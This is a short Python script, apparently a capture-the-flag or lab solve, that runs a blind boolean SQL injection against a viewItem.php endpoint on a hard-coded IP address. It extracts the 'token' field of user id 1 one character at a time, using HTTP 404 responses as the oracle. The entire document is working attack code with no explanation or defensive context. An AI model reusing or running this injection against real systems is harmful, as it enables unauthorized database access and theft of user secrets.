import requests

token = ''
position = 1

while(1):
    for i in range(0,255):
        url = 'http://103.167.133.102:16020/item/viewItem.php?id=1+AND+(SELECT+IF(1,(ASCII(SUBSTRING((SELECT+token+FROM+user+where+id=1),' \
        + str(position) + ',1))=' + str(i) + '),0))'
        r = requests.get(url)
        if r.status_code == 404:            
            token = token+str(chr(i))
            position = position + 1
            print(token)
    if len(token) == 15:        
        break